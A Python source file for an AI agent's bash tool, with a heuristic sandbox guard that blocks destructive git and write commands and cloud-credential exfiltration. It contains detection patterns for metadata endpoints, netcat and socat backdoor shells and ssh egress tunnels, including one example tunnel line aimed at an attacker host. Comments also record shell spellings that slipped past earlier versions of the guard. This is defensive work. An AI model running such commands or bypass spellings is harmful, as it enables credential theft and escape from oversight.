"""Bash tool — execute shell commands and return stdout/stderr."""

from __future__ import annotations

import asyncio
import locale
import logging
import os
import re
import shlex
import signal
import tempfile

from emrg._win import win32_no_window_kwargs
from emrg.server.git_utils import no_prompt_env
from emrg.server.tool_types import ToolDefinition, ToolResult
from emrg.tools.base import ToolExecutor

logger = logging.getLogger(__name__)


MAX_OUTPUT_CHARS = 200_000  # Truncate large outputs (framing supports up to 16MB)

# Heredoc start: `cmd <<'EOF'` / `cmd <<EOF` / `cmd <<-EOF` (quote optional,
# matched symmetrically via backreference). MULTILINE so ^/$ bound the first
# command line, not the whole command string. cmd.exe cannot parse this.
_HEREDOC_START_RE = re.compile(
    r"^(?P<head>.*?)(?P<op><<-?)(?P<quote>['\"]?)(?P<name>[A-Za-z_][A-Za-z0-9_.-]*)(?P=quote)\s*$",
    re.MULTILINE,
)


def _translate_windows_heredocs(cmd: str) -> tuple[str, str | None]:
    """Translate the first bash heredoc into a stdin redirect for cmd.exe.

    The bash tool's subprocess shell on Windows is cmd.exe (via COMSPEC),
    which cannot parse ``cmd <<'EOF' ... EOF`` heredocs — commands documented
    with heredoc syntax (e.g. ``browser-harness <<'PY' ... PY``) fail with
    ``<< is not recognized`` / ``此时不应有 <<``, forcing agents into temp-file
    workarounds. Rewriting the heredoc to ``cmd < tempfile`` feeds the same
    bytes via stdin redirect, so Windows agents run the identical commands as
    POSIX (host sessions 2026-08-14T21:26/21:36 observed the failure twice).

    Only the FIRST heredoc is translated (multiple heredocs in one command are
    rare); an unterminated heredoc is left untouched so cmd.exe reports the
    original error. ``<<-`` (tab-stripping) strips leading tabs from the body,
    mirroring bash. Content is written literally (quoted ``<<'EOF'``
    semantics; unquoted heredocs containing ``$`` expansion keep literal
    content — a documented approximation). Everything before the opener line
    (e.g. ``cd /tmp\n`` in a multi-line command) is preserved verbatim in the
    rewritten command, so the heredoc feeds the same stdin into the same
    command line as POSIX (review #797 ❌).

    Returns ``(rewritten_cmd, temp_path)`` — the caller must unlink temp_path
    after the subprocess finishes (normal or timeout path).
    """
    m = _HEREDOC_START_RE.search(cmd)
    if not m:
        return cmd, None
    head, op, name = m.group("head"), m.group("op"), m.group("name")
    strip_tabs = op.endswith("-")
    # Terminator: a line containing exactly the delimiter (optionally indented
    # with tabs when the opener used `<<-`, mirroring bash tab-stripping).
    term = re.compile(rf"(?m)^[ \t]*{re.escape(name)}\s*$" if strip_tabs
                      else rf"(?m)^{re.escape(name)}\s*$")
    tm = term.search(cmd, m.end())
    if not tm:
        return cmd, None  # unterminated — let cmd.exe report it
    body = cmd[m.end():tm.start()]
    if body.startswith("\r\n"):
        body = body[2:]  # opener-line newline is not part of the body
    elif body.startswith("\n"):
        body = body[1:]
    if strip_tabs:
        body = "\n".join(line.lstrip("\t") for line in body.split("\n"))
    # bash keeps the newline that precedes the terminator line as part of the
    # body (a heredoc always ends with exactly one newline) — keep it verbatim.
    tail = cmd[tm.end():].strip()
    fd, path = tempfile.mkstemp(suffix=".heredoc", text=True)
    try:
        # newline="" keeps LF verbatim (no CRLF conversion of the body)
        with os.fdopen(fd, "w", encoding="utf-8", newline="") as f:
            f.write(body)
    except Exception:
        try:
            os.unlink(path)
        except OSError:
            pass
        raise
    # Keep everything before the opener line (multi-line commands such as
    # `cd /tmp\npython <<'PY'` must not lose their prefix — review #797 ❌).
    rewritten = f"{cmd[:m.start()]}{head}< \"{path}\""
    if tail:
        rewritten += f" {tail}"
    return rewritten.rstrip(), path


# ── Sandbox — file-level isolation for the bash tool (rant 2026-08-20T15:46:50) ──
#
# Three tiers (default danger-full-access = current, un-sandboxed behavior):
#   danger-full-access  — no checks at all (existing behavior)
#   read-only           — no writes allowed: destructive commands (rm -r /
#                         rmdir / mv / cp -r), git mutating commands (stash /
#                         checkout / restore / clean / reset / commit / push /
#                         pull / merge / rebase — community issue #979) and
#                         shell redirects (> / >>) to any non-/dev/null target
#                         are blocked
#   workspace-write     — writes are allowed only inside three roots: the
#                         workspace root, the OS temp root
#                         `tempfile.gettempdir()` ($TMPDIR on macOS —
#                         /var/folders/<…>/T, NOT /tmp there; /tmp on Linux),
#                         and the trusted data roots (`_trusted_write_zones`).
#                         Destructive writes to protected daemon state files
#                         and to every other absolute path are blocked.
#                         Measured 2026-09-16: `$TMPDIR/x` ALLOW while `/tmp/x`,
#                         `/private/tmp/x`, `/var/tmp/x`, `/dev/shm/x` BLOCK —
#                         "the OS temp area" is gettempdir(), not a guess at it
#   both checked tiers  — destination-based containment-escape guard
#                         (issue #1102, borrowed from Claude Code v2.1.257):
#                         cloud metadata-credential fetches (IMDS/ECS/GCP)
#                         and egress-tunnel markers (ssh -R/-D, nc -e,
#                         socat EXEC:/SYSTEM:, IMDSv2 token) are blocked;
#                         the danger tier only warns (command still runs)
#
# Enforcement is deliberately heuristic (host design-finalized): a static
# command scan, NOT an OS-level sandbox (no bwrap/Seatbelt/ACL). The checked
# modes report enforcement="partial" — honest reporting, never pretending
# full OS-level isolation. The core value is blocking a hallucinated LLM's
# obviously destructive commands (rm -rf with a wrong path, writing the
# daemon's own state files).

SANDBOX_MODES = ("danger-full-access", "read-only", "workspace-write")

# Daemon state files — writing to these from a sandboxed task is always
# blocked (they are the daemon's own data, not agent scratch space).
_PROTECTED_FILES = (
    "~/.emrg/config.toml",
    "~/.emrg/emrgd.token",
    "~/.emrg/tasks.yml",
    "~/.emrg/projects.yml",
    "~/.emrg/rants.jsonl",
)

# Shell operators that separate one command from the next in a chain. After
# tokenizing with punctuation_chars these arrive as their own tokens, which is
# what lets `_args_after_command` stop at the next command.
_COMMAND_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})

# Verbs whose *arguments are files they rewrite in place*. They were invisible
# to the old spelling-based scan (issue #1162): `sed -i`, `truncate`, `tee`.
# A read-only cycle exists to protect uncommitted work, and every one of these
# can destroy it just as completely as `rm -rf`.
_INPLACE_WRITER_VERBS = frozenset({"truncate", "tee", "shred"})

# Options that take their value as the *next* token. Filtering arguments by
# `not startswith("-")` alone cannot tell an option's value from an operand:
# `truncate -s 0 a.txt` yields `0` (the size) as the first non-flag token, so
# the block would name the size instead of the file. Only the options that
# actually appear in the verbs covered below are listed — this stays a
# decision aid, not a full getopt implementation.
_OPTIONS_WITH_VALUE = frozenset({
    "-s", "--size",          # truncate
    "-o", "--output",        # tee
    "-n", "-N", "-s", "--size",  # shred
    "-e", "--expression",    # sed
})

# Git mutating commands — blocked under read-only (community issue #979,
# heinrichneb dev.to comment on the 2026-08-20 data-loss postmortem): the
# incident's actual killers (`git stash`, `git checkout .`, `git reset --hard`,
# `git clean`) were NOT caught by the rm/rmdir/mv/cp checks. Under read-only
# these must be structurally impossible, not merely discouraged by a prompt
# rule — "rules can regress; topology can't". Read-only git reads (status /
# fetch / log / diff / remote) stay allowed.
#
# ⚠️ These are matched against the **parsed** command (the resolved verb), not
# against raw command text (issues #1156 + #1159). Both filed defects had the
# same root cause: a regex over the raw string is a statement about *spelling*,
# while the guard's purpose is a statement about *effect*.
#
#   - Under-block (#1156): a git global option sits exactly where the old
#     pattern expected the subcommand, so `git -C . checkout .`,
#     `git -c x=1 stash` and `git --work-tree=. reset --hard` were all allowed
#     (7/7 mutators × 4/4 spellings).
#   - Under-block (#1159): a verb never on the list — `git read-tree -u --reset
#     HEAD` destroys uncommitted work and was allowed. `--reset` is a substring
#     but not the verb, so it did not match.
#   - Over-block: the same raw-text scan refused commands that merely *mention*
#     a mutator (a string literal inside a heredoc), and `git merge-base` was
#     refused as though it were `git merge`.
#
# Parsing fixes all three at once and is the reason this is a verb set rather
# than more regex: the unit of protection becomes the resolved verb.
#
# ⚠️ The set is a **read allowlist** and the default is BLOCK
# (`_git_invocation_is_mutator` returns the verb for anything not listed). The
# earlier design was the opposite — a blocklist of mutating verbs — and that is
# a category that cannot be completed: `git help -a` lists 169 subcommands and
# upstream adds more, so "not on the list" is a permanent, growing set of
# *allowed* commands. Measured on the blocklist: 129 of 169 subcommands stayed
# allowed, and `git checkout-index -f -a` — which overwrites uncommitted work
# exactly like `git checkout` — was blocked only by accident, because the old
# raw-text regex matched `checkout` as a *substring* of `checkout-index`.
# Parsing the verb correctly removed that accident and exposed the hole.
# Fail-closed deletes the category: a verb is allowed only when it is listed
# here as one that prints information and writes nothing. Unknown and future
# subcommands block by default, which is the safe direction for a guard whose
# failure mode is silent, irreversible data loss.
_GIT_READ_VERBS = frozenset({
    # porcelain interrogators — print information, write nothing
    "status", "log", "show", "diff", "diff-files", "diff-index", "diff-tree",
    "diff-pairs", "shortlog", "whatchanged", "describe", "blame", "annotate",
    "name-rev", "rev-list", "rev-parse", "range-diff", "grep", "ls-files",
    "ls-tree", "ls-remote", "cat-file", "merge-base", "merge-tree",
    "for-each-ref", "for-each-repo", "show-branch", "show-index", "show-ref",
    "count-objects", "verify-commit", "verify-pack", "verify-tag", "patch-id",
    "get-tar-commit-id", "fsck", "refs", "revisions", "var",
    "version", "help", "repository-layout",
    # pure stdin/stdout text filters — read a stream, print a stream
    "check-attr", "check-ignore", "check-mailmap", "check-ref-format",
    "fmt-merge-msg", "mailmap",
    "stripspace", "column",
    # Deliberately absent: `mailinfo <msg> <patch>` writes both named paths,
    # `mailsplit -o <dir>` writes into dir. They were listed here as "text
    # filters" and are writers; the allowlist is default-BLOCK, so leaving
    # them out is the fix.
    # Remote-tracking / credential inspection: these write only under .git or
    # in the user's credential store, never the working tree — and issue #979 is
    # a dirty-tree guard. `fetch` is deliberately kept: the previous design
    # allowed it, it cannot destroy uncommitted work, and refusing it would be a
    # usability regression with no safety gain.
    "fetch",
    # `git cherry` reports the commits that are not upstream. Unlike the
    # three verbs above it has no writing subcommand at all, so there is no
    # shape to decide — it belongs on the read list rather than in the shape
    # logic (issue #1240).
    "cherry",
})
# Verbs whose *shape* decides — the verb alone says nothing about the effect.
# Kept out of `_GIT_READ_VERBS` so each is judged by explicit logic, and each
# defaults to BLOCK when its shape is not a proven read.
_GIT_SHAPE_DECIDED = frozenset({"stash", "worktree", "submodule", "remote",
                                "branch", "tag", "config", "hash-object",
                                "interpret-trailers", "credential",
                                # issue #1240: these three are reads in their
                                # reporting shape and writes in another, so the
                                # verb alone cannot decide them — they were
                                # previously refused outright, which made the
                                # reason string ("mutating command") false about
                                # them and cost a downgraded cycle the one read
                                # that explains a dirty tree (`git reflog`).
                                "reflog", "notes", "bisect"})
# Listing flags for `branch` / `tag`: with one of these the command prints and
# writes nothing, even when a pattern argument follows (`git tag -l 'v*'`).
# `--output <file>` / `--output=<file>`: the redirect the diff-family readers
# spell as an option.
_OUTPUT_FLAG_RE = re.compile(r"--output(?:-file)?(?:=|$)")
_GIT_LIST_FLAGS = frozenset({"-l", "--list", "-a", "--all", "-r", "--remotes",
                             "-v", "-vv", "--verbose", "--contains", "--merged",
                             "--no-merged", "--points-at", "--format",
                             "--show-current", "--column", "--sort", "--color",
                             "--no-color", "--ignore-case"})
# `git branch -a` / `git tag -l` / `git tag` are reads; a delete or force flag
# makes them destructive (`git branch -D old`, `git tag -d v1`).
#
# `--unset-upstream` belongs here for the same reason as `--delete`: it writes
# (it removes the branch's upstream from `.git/config`), and it takes no
# argument, so no positional rule can catch it — measured 2026-09-16, it was
# ALLOWED under read-only and really did clear the upstream.
_GIT_WRITE_FLAGS = frozenset({"-d", "-D", "--delete", "-f", "--force", "-m",
                              "-M", "--move", "--set-upstream-to", "-u",
                              "--unset-upstream"})
# `git config` reads unless it writes: read flags, or no positional key.
_GIT_CONFIG_READ_FLAGS = frozenset({"--get", "--get-all", "--get-regexp",
                                    "-l", "--list", "--get-urlmatch"})
# The flags that write. Naming them explicitly is the difference between a
# decision about the flag and an accident of the positional rule below: `--add
# k v` blocks because it leaves two positionals, `--replace-all k v r` for the
# same reason — but `--unset k` leaves one and read as a read, `--edit` leaves
# none. Measured on master with git 2.50.1, six spellings wrote while read-only
# said ALLOW: `--unset`, `--unset-all`, `--edit`, `-e`, `--remove-section`, and
# the subcommand `edit`. The mirror image was also live: `git config get k` — a
# pure read in git's subcommand spelling — was refused as a write.
_GIT_CONFIG_WRITE_FLAGS = frozenset({"--unset", "--unset-all", "--add",
                                     "--replace-all", "--rename-section",
                                     "--remove-section", "--edit", "-e"})
# git 2.46+ accepts the same operations as subcommands without the `--`. Both
# spellings must land on the same verdict; the lists are kept apart on purpose,
# because `set`/`unset`/`edit` in *command* position are writes while the same
# words as a config *key* are not our business. Only the one-word subcommands
# actually need this branch (`unset k` is still caught below by leaving two
# positionals); `git config edit` leaked precisely because its flag form has no
# argument to count, so the rule that saved the others was not a rule at all.
_GIT_CONFIG_WRITE_SUBCOMMANDS = frozenset({"set", "unset", "unset-all", "add",
                                           "replace-all", "rename-section",
                                           "remove-section", "edit"})
_GIT_CONFIG_READ_SUBCOMMANDS = frozenset({"get", "get-all", "get-regexp",
                                          "get-urlmatch", "list"})
# The `git config` options that take a SEPARATE value. `_GIT_SUBCOMMAND_WITH_VALUE`
# is shared by every verb, so they are named here instead of there: a value left
# in the positional list is not neutral, it is counted — and the count is what
# decides the verb. Measured with git 2.50.1 (issue #1273, row 3), every one of
# these leaves a single positional key, so each **reads**, and each was refused
# as a write:
#   git config --file <p> user.name            rc=1, no file touched
#   git config -f <p> user.name                rc=1, no file touched
#   git config --type int user.name            rc=1, no file touched
#   git config --default fallback user.name    rc=0, no file touched
# `--blob` and `--comment` are here for the same reason — that they take a value
# — not because each was caught over-blocking: `--comment note user.name probe`
# really wrote `.git/config` (rc=0), and the value was already the second
# positional there, so that spelling blocks either way.
# Adding a value still blocks: skipping the option's value leaves the key and the
# value the caller wrote, which is two positionals. `git config --file <p> user.name
# probe` really wrote `<p>` (rc=0, bytes changed) and is still refused.
#
# Membership is the whole of this set's safety, so it is **measured** rather than
# asserted here (issue #1291): a value-less member swallows a genuine positional
# and the count then reads a write as a read — `git config --no-type a.b c` really
# writes `.git/config` (rc=0) and 7 more of the 16 value-less options measured do
# the same. `tests/test_bash_tool_sandbox.py::test_every_config_value_option_consumes_its_value`
# asks git itself, with nothing after the option: a value-taking member is reported
# as `error: option `file' requires a value` (`switch `f' …` for the short form),
# while a value-less one runs on to `error: no action specified` and one git does
# not know to `error: unknown option`. It then re-runs each member in the shape this
# walk counts and compares every byte. The byte watch alone was not enough to make
# that a measurement — a command git *refuses* changes no bytes either: with
# `--local` added to this set and a dot-less probe value, the watch stayed green
# while `git config --local user.name probe` was allowed at read-only. Adding a
# member is therefore a change that has to come past git's own answer (and past the
# value table the probe needs), not past a comment.
_GIT_CONFIG_VALUE_OPTS = frozenset({"--file", "-f", "--blob", "--type",
                                    "--default", "--comment"})
# git global options that take a SEPARATE argument — the parser must skip both
# the option and its value to find the verb (`git -C . checkout .`).
_GIT_GLOBAL_WITH_VALUE = frozenset({"-C", "-c", "--exec-path", "--git-dir",
                                    "--work-tree", "--namespace", "--super-prefix"})

# git *subcommand-level* options that also take a SEPARATE value. They are not
# global options, so the splitter above does not skip their values — and without
# this set a value occupies the subcommand slot: `git notes --ref refs/notes/x
# list` read `refs/notes/x` as the subcommand, and `git reflog -n 5` read `5` as
# it, so both were refused as "mutating" (issue #1240, measured 2026-09-15).
#
# Only flags whose value is mandatory belong here. Adding one that takes no value
# would let the *subcommand* be skipped, which is the fail-open direction; each
# entry below is a real separator-form option of a verb in `_GIT_SHAPE_DECIDED`.
_GIT_SUBCOMMAND_WITH_VALUE = frozenset({
    "-n", "--max-count", "--skip", "--ref", "--date", "--pretty", "--format",
    "--grep", "--author", "--committer", "--since", "--until",
})
# Shell operators that separate one command from the next in a chain.
_SHELL_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})
# Tokens that put what follows them in command position without being commands
# themselves: grouping (`( … )`, `{ … }`) and shell negation (`! cmd`).
_COMMAND_POSITION_OPERATORS = frozenset({"(", "{", "!", "`", ">(", "<(", ")"})
# Shell keywords after which the next word is a command, not an argument.
_SHELL_KEYWORD_POSITION = frozenset({"if", "then", "elif", "else", "while", "until", "do"})
# Prefix commands that *run* their argument as a command. `env git checkout .`
# and `sudo git checkout .` genuinely invoke git, so a `git` token after one of
# these is an invocation even though it is not first in the stream. This is the
# case that stops the over-block fix from becoming an under-block.
_COMMAND_WRAPPERS = frozenset({
    # `eval` joins its arguments and executes the result; `-exec`/`-execdir` hand
    # the next word to execve. Both put the command where the walk looks for a
    # wrapper's argument. They are spells of the same prefix, and the flag shape
    # is deliberate: the value-skip below is what keeps `find . -exec grep git
    # {} \;` allowed, because `grep` is consumed as the flag's value.
    "eval", "-exec", "-execdir",
    "env", "sudo", "doas", "xargs", "nohup", "time", "timeout", "nice",
    "setsid", "stdbuf", "command", "exec", "ionice", "chrt", "watch",
})
# `FOO=1 git checkout .` — the shell strips leading assignments and runs the
# rest, so an assignment is a prefix, not a command.
_ENV_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# Shells whose `-c <string>` argument is itself a command the shell will run.
# The guard must read *that* text, not stop at the outer token stream: before
# this, `sh -c 'git checkout .'` reached the mutator only because a raw-text
# regex happened to scan the whole line. Parsing the outer tokens alone sees
# `sh`, `-c`, and one opaque string — so a wrapper no longer blocks unless the
# nested text is parsed too. This is a return to the old behaviour by a
# different route: the old scan was right about these 5 shapes and wrong about
# the 7 it missed; parsing must not trade one half for the other.
_SHELL_WRAPPERS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "ash"})
# Commands whose entire argument list is a command the shell will re-parse and
# run (`eval 'git checkout .'`). `xargs`/`env`/`nohup`/`time`/`command` prefix
# a real invocation and are already handled, because the invocation is still in
# the token stream.
_SHELL_EVALUATORS = frozenset({"eval"})
# A program word that is a *variable reference* is one the guard cannot resolve:
# `$SHELL` is `sh`, `bash` or `zsh` depending on the host, and `$HOME` is a
# different absolute path on every one. A guard cannot enumerate how a shell
# spells itself, so the safe direction is to stop reading a decision out of text
# that has not been expanded yet (issue #1244).
#
# A parameter expansion is a **lexeme class, not a list of names**. It has four
# shapes, and only the two simplest were named here at first:
#
#   `$NAME`            `$SHELL`          the form everyone writes
#   `${NAME}`          `${SHELL}`        the same, braced
#   `${NAME<op>...}`   `${SHELL:?}`, `${SHELL:-sh}`, `${SHELL//x/y}`
#   `$X` (special)     `$0`, `$@`, `$?`, `$$` — set by the shell itself
#
# plus any concatenation of these (`${A}${B}`). Measured on master `cca0b8dc`,
# read-only tier, each driven end to end through `BashTool.execute` against a
# scratch repo holding one uncommitted edit: `$0 -c 'git checkout .'`,
# `${SHELL:?} -c 'git checkout .'`, `${SHELL:-sh} -c 'git checkout .'` and
# `${SHELL//x/y} -c 'git checkout .'` all answered ALLOW and all **discarded the
# edit**, while `$SHELL -c 'git checkout .'` blocked on the same mutator. `$0` is
# the shell already running the line, so the word is a wrapper the guard cannot
# place. The class defeated the *path* rule the same way: at workspace-write
# `echo x > ${EMRG_PROBE_OUT:?}/escaped.txt` answered ALLOW and **created the file
# outside the workspace**, while `$EMRG_PROBE_OUT/escaped.txt` blocked. Naming two
# spellings of a class while its other spellings pass is the #461 defect; the
# class is what has to be matched.
_PARAM_EXPANSION = r"\$(?:\{[^}]*\}|[A-Za-z_0-9@*#?$!-][A-Za-z0-9_]*)"
_UNRESOLVED_VAR_RE = re.compile(rf"(?:{_PARAM_EXPANSION})+")
# A variable that supplies the *root* of a path (`$HOME/.emrg/config.toml`),
# rather than a whole name on its own (`$DST`). The distinction is what keeps the
# write-target rule below from refusing `cp $SRC $DST` — see it for why.
_UNRESOLVED_ROOT_RE = re.compile(rf"(?:{_PARAM_EXPANSION})+[\\/]")

# The variable a *write target* is rooted in (`$T/f`, `${T}/f`), read as the
# plain name so the value the command gave it can be looked up. The expansion
# operators of `_PARAM_EXPANSION` are deliberately not matched here: the value
# of `${T:?}` is decided by the shell's `:?` and not by any assignment, so there
# is nothing to look up and the token keeps its refusal (issue #1316). The `/`
# is a lookahead rather than part of the match — it is what makes the variable a
# *root* and not a whole operand, and it has to stay in the text the resolved
# value is spliced into (a match that ate it turned `$T/f` into `./innerf`).
_LEADING_VAR_ROOT_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?(?=/)")
# The var-is-the-whole-token case (`cd "$D"`, `D=<dir> && cd "$D"`): there is no
# separator after the variable, so the root pattern above — whose whole point is
# the `/` lookahead — has nothing to match and the value would never be looked
# up. The name charset is the same one, for the same reason: an expansion
# operator (`${D:?}`) is decided by the shell rather than by an assignment, and
# a special parameter (`$0`, `$@`) has no assignment to look up at all.
_WHOLE_VAR_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$")

# What a command-local assignment may hold to be usable as a resolution: a
# literal path fragment and nothing else. `T=$(mktemp -d)`, ``T=`uname` ``,
# `T="$A/$B"` and `T="a b"` are values only the shell can build, and
# `T=../outside` is a literal that would move a relative write target out of the
# workspace — so the class is refused rather than resolved (issue #1316).
_ASSIGNED_LITERAL_VALUE_RE = re.compile(r"^[A-Za-z0-9._/+-]+$")

# The same class, spelled the way an *absolute* value is spelled on Windows: the
# charset above cannot express one, because `:` is not in it, so `T=D:/ws && cat >
# "$T/f"` was refused as undecidable however plainly absolute it is. That is the
# false block of issue #1316 surviving on the one platform whose scratch root is
# most likely to be absolute (issue #1354).
#
# `:` is admitted in the drive position only, and only with a forward slash after
# it: a backslash is shlex's escape character, so `D:\ws` reaches this file as a
# word that is not a path at all (`D:ws`) — a separate and older defect, issue
# #1261, which this charset cannot fix and must not pretend to.
#
# Widening the class grants no permission. A value it now admits is *resolved*,
# not trusted: the result is handed to the same `_is_within` / protected-file /
# moved-out checks a POSIX absolute value already goes to, so the change turns
# "unresolvable, so refused" into "placed, so judged". The `..` exclusion still
# applies to both spellings (`_assigned_value_is_decidable`).
_ASSIGNED_DRIVE_ROOTED_VALUE_RE = re.compile(r"^[A-Za-z]:/[A-Za-z0-9._/+-]*$")

# ── Heredocs: a body is DATA unless a program eats it as a program ──────────
# A heredoc body is text on some command's stdin. It is shell *code* only when
# the consumer is a shell (`sh <<EOF` runs the body); for `cat <<EOF` it is
# data, and every `>`, `->`, `rm` or `git checkout .` inside it is a character.
# The scanners below parse a command text with the tokenizer, so a body used to
# be read as shell code by accident of *text* — see
# `_mask_data_heredoc_bodies` for what that cost, measured.
#
# This is an allowlist on purpose, and the direction of the bias is the point:
# a consumer that is not named here keeps today's behaviour (the body is
# scanned), so an unenumerated interpreter — `ssh host <<EOF`, `sed <<EOF`,
# `patch <<EOF` — stays guarded. Naming the *readers* rather than the programs
# that execute is what makes the unenumerated case fail closed.
#
# The interpreters are named because the guard ALREADY allows their inline
# spelling: `python3 -c "print(1 > 0)"` and `python3 -c 'import os;
# os.system("rm -rf /tmp/y")'` are both allowed on master (measured), and the
# same script in a heredoc must not be judged differently for its spelling.
_DATA_READER_CONSUMERS = frozenset({
    "cat", "grep", "egrep", "fgrep", "rg", "wc", "head", "tail", "diff",
    "jq", "nl", "sort", "uniq", "python", "python3", "node",
})

# A second, narrower readership: a tool that eats stdin as a *message* for one
# of its subcommands (issue #1320). `git` cannot go in the set above — that set
# is a property of the *tool*, and git runs a program for other subcommands — so
# the reader is pinned on two further axes: the subcommand, and an operand that
# names stdin (`-F -`, `--file -`, `--file=-`, `-F-`; all four measured against
# git 2.50.1 to put the body into the tag message). Nothing else may be on the
# line, because a global option before the subcommand and an env prefix can both
# decide what the subcommand *does*:
#
#   measured, git 2.50.1, inside a scratch repo — `git -c core.editor=sh commit
#   -F - -e 'BODY'`, with `BODY` one `echo EDITOR_RAN` line, printed
#   EDITOR_RAN and committed: the body ran as a script. So did the same override
#   spelled through the environment (`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=
#   core.editor GIT_CONFIG_VALUE_0=sh commit -F - -e`), which is why an env
#   prefix forfeits the mask too. The shape issue #1320 names instead,
#   `git -c alias.commit='!sh' commit -F -`, did *not* run it — git refuses to
#   let an alias shadow a builtin, so `commit` stayed the builtin and read the
#   body as a message. The refusal below is therefore load-bearing against the
#   editor route, not against the alias; it costs a rare false positive
#   (`git -C <dir> commit -F -`), which is the direction this guard errs in.
_STDIN_MESSAGE_READERS = {
    "git": frozenset({"commit", "tag"}),
}
_STDIN_OPERAND_SEPARATE = frozenset({"-F", "--file"})
_STDIN_OPERAND_ATTACHED = frozenset({"-F-", "--file=-"})

# ── Containment-escape guard (issue #1102) ─────────────────────────────────
# Borrowed from Claude Code v2.1.257 ("Containment Escape"): block cloud
# metadata-credential fetches and egress-tunnel markers. The write-target
# scan cannot catch these — a metadata fetch is a READ and touches no
# protected file path, so the destination-based scan below is required.

# Cloud metadata endpoints — never legitimate in development commands.
# IMDSv1/v2 (AWS), ECS container creds (AWS), GCP metadata (IP + DNS),
# IMDSv2 IPv6 (AWS).
_METADATA_ENDPOINT_RE = re.compile(
    r"169\.254\.169\.254|169\.254\.170\.2|169\.254\.169\.123|"
    r"metadata\.google\.internal|fd00:ec2::254"
)
# ssh remote/dynamic forward (-R / -D) — the classic egress tunnels
# (`ssh -R 1080:169.254.169.254:80 user@attacker`). Requires a standalone
# `ssh` token (never ssh-add/ssh-agent/ssh-keygen/...), stops at quotes so
# `ssh host 'grep -R x'` (a remote command, not a tunnel) is not flagged, and
# does NOT block `-L` (the common dev port-forward; a `-L` whose destination
# is a metadata endpoint is already caught by the endpoint rule above).
_SSH_TUNNEL_RE = re.compile(
    r"(?<!\S)ssh(?:\.exe)?\s+(?:[^|;&\n'\"]*?\s)?-[a-zA-Z]*[RD][a-zA-Z]*"
)
# ssh long-form forwards (`-o RemoteForward=...` / `-o DynamicForward=...`).
# These are often quoted (`-o 'RemoteForward=1080:localhost:80'`), so this
# rule deliberately does NOT stop at quotes — the RemoteForward=/DynamicForward=
# string has no legitimate non-tunnel use (unlike `-R`, which collides with
# `grep -R` inside remote commands).
_SSH_FORWARD_LONG_RE = re.compile(
    r"(?<!\S)ssh(?![\w-])[^|;&\n]*?\b(?:Remote|Dynamic)Forward\s*="
)
# netcat / ncat with -e/--exec — a reverse/backdoor shell, never legitimate.
_NC_EXEC_RE = re.compile(
    r"\bnc(?:at)?\b[^|;&\n'\"]*?(?:-[a-zA-Z]*e[a-zA-Z]*\b|--exec\b)"
)
# socat with EXEC:/SYSTEM: — a backdoor address, never legitimate.
_SOCAT_EXEC_RE = re.compile(r"\bsocat\b[^|;&\n'\"]*\b(?:EXEC|SYSTEM):")
# IMDSv2 token request header — belt-and-suspenders for URL-obfuscated fetches.
_IMDSV2_TOKEN_RE = re.compile(r"X-aws-ec2-metadata-token")


def _check_containment_escape(cmd: str) -> str | None:
    """Destination-based containment-escape scan (issue #1102, borrowed from
    Claude Code v2.1.257 "Containment Escape").

    Returns a block reason naming the exact escape vector when the command
    fetches cloud metadata credentials or opens an egress tunnel; returns
    None when the command looks clean.

    Complements the write-target scan: ``curl http://169.254.169.254/...``
    touches no protected file path, so ``workspace-write`` target checks pass
    it — the credential exfiltration happens over the network. Runs on both
    checked tiers (read-only blocks writes, but a metadata fetch is a read,
    so the destination check is required there too).
    """
    for label, pattern in (
        ("cloud-metadata endpoint", _METADATA_ENDPOINT_RE),
        ("ssh egress tunnel (-R/-D)", _SSH_TUNNEL_RE),
        ("ssh egress tunnel (Remote/DynamicForward)", _SSH_FORWARD_LONG_RE),
        ("netcat exec backdoor", _NC_EXEC_RE),
        ("socat EXEC/SYSTEM backdoor", _SOCAT_EXEC_RE),
        ("IMDSv2 token request", _IMDSV2_TOKEN_RE),
    ):
        m = pattern.search(cmd)
        if m:
            return (
                f"containment-escape: blocked {label} {m.group(0)!r} "
                "(cloud credential exfiltration guard, issue #1102)"
            )
    return None


# ── Windows path spellings (issue #1261) ────────────────────────────────────
#
# The guard tokenises with `shlex` in POSIX mode, where a backslash is an
# *escape* character. A Windows shell (cmd.exe — the bash tool's subprocess
# shell on that platform) treats the same character as a *path separator*, so
# the two readings of one text disagree by exactly the characters a Windows path
# is made of. Measured on master `cca0b8dc`, `echo x > C:\Users\x\out.txt`
# reached the workspace-write boundary as the single token `C:Usersxout.txt` —
# a *relative* name, therefore "inside the workspace", therefore allowed. Ten
# such spellings measured (redirect incl. append, rm -rf, mv, cp, sed -i,
# find -delete, chained), every one allowed at workspace-write while its
# absolute POSIX twin was refused; `read-only` was unaffected, since that tier
# refuses every target without asking where it resolves.
#
# The repair is a character substitution on the copy the guard tokenises, never
# on the command that is executed: each backslash becomes a placeholder `shlex`
# has no meaning for, so the separators survive the split, and the placeholder
# is put back on the way out. Substitution rather than a "mangled form → raw
# spelling" lookup on purpose — a lookup has a silent failure mode (a key that
# does not match leaves the path mangled and every rule reading it inert),
# while a character that was never removed cannot fail to be restored.
#
# Gated on the shell the command will actually run in. On POSIX a backslash is
# an escape, so `C:\Users\x` genuinely names the relative file `C:Usersx` and
# repairing it there would refuse an ordinary in-workspace write (`echo x >
# my\ file` is the same class of spelling, as issue #1162's cases are).
_WINDOWS_SHELL = os.name == "nt"

# A character no shell command can contain, so the restore cannot corrupt one.
_WINDOWS_BACKSLASH = "\x00"

# Drive-rooted: `C:\…` / `C:/…`. UNC (`\\server\share`) needs no pattern — it
# already reads as rooted through the `\` test in `_is_absolute_path`.
_WINDOWS_DRIVE_RE = re.compile(r"^[A-Za-z]:[\\/]")


def _protect_windows_backslashes(cmd: str) -> str:
    """Make backslashes survive the POSIX split — Windows shells only (#1261)."""
    if not _WINDOWS_SHELL or "\\" not in cmd:
        return cmd
    return cmd.replace("\\", _WINDOWS_BACKSLASH)


def _restore_windows_backslashes(tokens: list[str]) -> list[str]:
    """Undo `_protect_windows_backslashes`, so the guard reads the real spelling."""
    if not _WINDOWS_SHELL:
        return tokens
    return [t.replace(_WINDOWS_BACKSLASH, "\\") for t in tokens]

